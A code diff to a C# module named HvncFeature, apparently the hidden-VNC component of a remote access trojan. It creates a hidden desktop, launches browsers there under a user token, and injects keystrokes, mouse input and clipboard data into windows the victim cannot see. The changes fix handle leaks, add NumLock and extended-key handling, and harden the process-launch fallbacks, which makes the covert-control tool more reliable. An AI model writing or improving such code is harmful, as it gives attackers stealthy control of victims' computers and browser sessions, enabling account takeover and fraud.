@@ -67,6 +67,7 @@ internal static class HvncFeature
     static extern nint OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);
     [DllImport("user32.dll")] static extern nint   GetProcessWindowStation();
     [DllImport("user32.dll")] static extern bool   SetProcessWindowStation(nint hWinSta);
+    [DllImport("user32.dll")] static extern bool   CloseWindowStation(nint hWinSta);
     [DllImport("user32.dll")] static extern bool   IsWindowVisible(nint hwnd);
     [DllImport("user32.dll")] static extern bool   IsIconic(nint hwnd);
     [DllImport("user32.dll")] static extern bool   GetWindowRect(nint hwnd, out RECT lpRect);
@@ -116,6 +117,7 @@ internal static class HvncFeature
     [DllImport("kernel32.dll")] static extern nint GlobalAlloc(uint uFlags, nuint dwBytes);
     [DllImport("kernel32.dll")] static extern nint GlobalLock(nint hMem);
     [DllImport("kernel32.dll")] static extern bool GlobalUnlock(nint hMem);
+    [DllImport("kernel32.dll")] static extern nint GlobalFree(nint hMem);
 
     [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
     static extern nint CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
@@ -329,7 +331,7 @@ internal static class HvncFeature
         { "chrome.exe", "msedge.exe", "opera.exe", "operagx.exe", "brave.exe", "vivaldi.exe", "chromium.exe" };
 
     // Modifier key state — tracked by HandleKey, used by VkToChars
-    private static bool _shiftDown, _ctrlDown, _altDown, _capsLock;
+    private static bool _shiftDown, _ctrlDown, _altDown, _capsLock, _numLock;
     private static readonly byte[] _vkState = new byte[256];
     private static readonly System.Text.StringBuilder _vkSb = new(8);
 
@@ -366,7 +368,7 @@ internal static class HvncFeature
         // and processes launched with the user token can actually find it.
         const uint WINSTA_ALL_ACCESS = 0x0000037F;
         nint hWinSta = OpenWindowStation("WinSta0", false, WINSTA_ALL_ACCESS);
-        if (hWinSta != 0) SetProcessWindowStation(hWinSta);
+        if (hWinSta != 0) { SetProcessWindowStation(hWinSta); CloseWindowStation(hWinSta); }
 
         // Create or open hidden desktop
         _hDesktop = CreateDesktop(DesktopName, 0, 0, 0, DESKTOP_ALL, 0);
@@ -412,11 +414,12 @@ internal static class HvncFeature
         }
         else
         {
-            // PrintWindow hung for >5 s — leak GDI handles rather than calling
-            // CloseDesktop/GdiplusShutdown under a live thread (UB / crash risk).
-            // Zero ALL composite + desktop fields so Start() allocates fresh resources
-            // and EnsureComposite() does not reuse stale handles before the orphan
-            // thread's own cleanup code runs.
+            // PrintWindow hung for >5 s — the orphan thread is blocked in kernel and
+            // will never reach its own cleanup. Free the WinCache entries here (safe:
+            // the orphan is not iterating the cache while stuck in PrintWindow).
+            // Do NOT call CloseDesktop/GdiplusShutdown under a live thread (UB / crash).
+            // Zero ALL composite + desktop fields so Start() allocates fresh resources.
+            FreeWinCache();
             _hDesktop = 0; _gdipToken = 0; _h264Enc = null;
             _compHdcRef = 0; _compHdc = 0; _compHbm = 0; _compBits = 0;
             _compW = 0; _compH = 0;
@@ -430,7 +433,7 @@ internal static class HvncFeature
         _lastHwnd        = 0;
         _lastLeftMs      = 0;
         _lastClickX      = _lastClickY = 0;
-        _shiftDown       = _ctrlDown = _altDown = _capsLock = false;
+        _shiftDown       = _ctrlDown = _altDown = _capsLock = _numLock = false;
         _loggedUiaChain  = false;
         // Kill all processes launched on the hidden desktop so they don't block relaunching.
         // Browsers get a graceful WM_CLOSE first so they flush their profile to disk cleanly —
@@ -533,6 +536,7 @@ internal static class HvncFeature
                 SetClipboardData(13 /*CF_UNICODETEXT*/, hMem);
                 ok = true;
             }
+            else { GlobalFree(hMem); }
         }
         finally { CloseClipboard(); }
 
@@ -787,8 +791,8 @@ internal static class HvncFeature
 
     private static void FreeComposite()
     {
+        if (_compHdc != 0) { DeleteDC(_compHdc);     _compHdc = 0; } // DC first — deselects bitmap
         if (_compHbm != 0) { DeleteObject(_compHbm); _compHbm = 0; }
-        if (_compHdc != 0) { DeleteDC(_compHdc);     _compHdc = 0; }
         _compBits = 0; _compW = 0; _compH = 0;
         _lastCompHash = 0; // force dirty on next frame after recreation
     }
@@ -804,7 +808,7 @@ internal static class HvncFeature
         if (hdc == 0) return null;
         var bmi = MakeBmi(w, h);
         nint hbm = CreateDIBSection(_compHdcRef, ref bmi, DIB_RGB_COLORS, out nint bits, 0, 0);
-        if (hbm == 0 || bits == 0) { DeleteDC(hdc); return null; }
+        if (hbm == 0 || bits == 0) { if (hbm != 0) DeleteObject(hbm); DeleteDC(hdc); return null; }
         SelectObject(hdc, hbm);
         var entry = new WinCache { Hdc = hdc, Hbm = hbm, Bits = bits, W = w, H = h };
         _winCache[hwnd] = entry;
@@ -813,8 +817,8 @@ internal static class HvncFeature
 
     private static void FreeCacheEntry(WinCache e)
     {
+        if (e.Hdc != 0) DeleteDC(e.Hdc);     // DC first — deselects bitmap
         if (e.Hbm != 0) DeleteObject(e.Hbm);
-        if (e.Hdc != 0) DeleteDC(e.Hdc);
     }
 
     private static void FreeWinCache()
@@ -904,6 +908,7 @@ internal static class HvncFeature
         if (_ctrlDown)  _vkState[0x11] = 0x80; // VK_CONTROL
         if (_altDown)   _vkState[0x12] = 0x80; // VK_MENU
         if (_capsLock)  _vkState[0x14] = 0x01; // VK_CAPITAL (toggle bit)
+        if (_numLock)   _vkState[0x90] = 0x01; // VK_NUMLOCK (toggle bit) — numpad digits vs navigation
         uint scan = MapVirtualKey((uint)vk, 0);
         _vkSb.Clear();
         int n = ToUnicode((uint)vk, scan, _vkState, _vkSb, 8, 0);
@@ -1278,6 +1283,7 @@ internal static class HvncFeature
             case 0x11: case 0xA2: case 0xA3: _ctrlDown  = down; break; // Ctrl
             case 0x12: case 0xA4: case 0xA5: _altDown   = down; break; // Alt
             case 0x14: if (down) _capsLock = !_capsLock; break;         // CapsLock toggle
+            case 0x90: if (down) _numLock  = !_numLock;  break;         // NumLock toggle
         }
 
         nint hwnd = SmartWindowFromPoint(new POINT { x = _curX, y = _curY });
@@ -1300,8 +1306,12 @@ internal static class HvncFeature
         }
 
         uint scan = MapVirtualKey((uint)vk, 0);
-        nint lpDn = (nint)(1u | (scan << 16));
-        nint lpUp = unchecked((nint)(0xC0000001u | (scan << 16)));
+        // PAGE_UP/DN, END, HOME, arrows (0x21–0x28), INSERT, DELETE (0x2D–0x2E) are extended keys.
+        // Without KF_EXTENDED some apps treat them as their numpad equivalents.
+        const uint KF_EXTENDED = 0x01000000;
+        bool isExtKey = vk is >= 0x21 and <= 0x28 or 0x2D or 0x2E;
+        nint lpDn = (nint)(1u | (scan << 16) | (isExtKey ? KF_EXTENDED : 0u));
+        nint lpUp = unchecked((nint)(0xC0000001u | (scan << 16) | (isExtKey ? KF_EXTENDED : 0u)));
 
         // Modifier keys: send WM_KEYDOWN/WM_KEYUP so the target thread's GetKeyState is updated.
         // Windows apps check GetKeyState(VK_CONTROL) when processing VK_A — they see it as pressed
@@ -2387,12 +2397,23 @@ internal static class HvncFeature
             nint launchToken = GetLaunchToken();
             nint envBlock = 0;
             if (launchToken != 0) CreateEnvironmentBlock(out envBlock, launchToken, false);
-            PROCESS_INFORMATION pi;
+            PROCESS_INFORMATION pi = default;
             if (launchToken != 0)
             {
                 if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
+                {
+                    // Close any handles the failed variant may have written before cascading.
+                    if (pi.hProcess != 0) { CloseHandle(pi.hProcess); }
+                    if (pi.hThread  != 0) { CloseHandle(pi.hThread);  }
+                    pi = default;
                     if (!CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
+                    {
+                        if (pi.hProcess != 0) { CloseHandle(pi.hProcess); }
+                        if (pi.hThread  != 0) { CloseHandle(pi.hThread);  }
+                        pi = default;
                         CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+                    }
+                }
             }
             else
             {
